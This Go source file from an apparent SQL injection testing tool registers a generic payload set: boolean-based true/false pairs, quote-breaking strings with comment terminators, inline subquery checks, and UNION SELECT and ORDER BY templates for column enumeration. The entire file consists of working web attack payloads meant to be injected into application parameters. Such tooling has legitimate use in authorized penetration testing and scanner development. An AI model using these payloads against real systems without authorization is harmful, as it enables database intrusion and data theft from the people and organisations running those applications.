package dbms

func init() {
	register(&Payloads{
		Name: Generic,
		Boolean: []BoolPair{
			{True: "{orig} AND 1=1", False: "{orig} AND 1=2"},
			{True: "{orig} AND 1=1-- -", False: "{orig} AND 1=2-- -"},
			{True: "{orig}' AND '1'='1", False: "{orig}' AND '1'='2"},
			{True: "{orig}' AND 'a'='a'", False: "{orig}' AND 'a'='b'"},
			{True: "({orig}) AND 1=1", False: "({orig}) AND 1=2"},
		},
		Inline: []BoolPair{
			{True: "{orig} AND (SELECT 8634)=8634", False: "{orig} AND (SELECT 8634)=8635"},
			{True: "{orig}' AND (SELECT 8634)=8634-- -", False: "{orig}' AND (SELECT 8634)=8635-- -"},
			{True: "{orig} AND (SELECT 1)=1", False: "{orig} AND (SELECT 1)=2"},
		},
		Union: UnionTemplates{
			OrderBy: []string{
				"{orig} ORDER BY {n}-- -",
			},
			UnionSelect: []string{
				"{orig} UNION ALL SELECT {cols}-- -",
				"{orig} UNION SELECT {cols}-- -",
			},
		},
		StackedOK: false,
	})
}
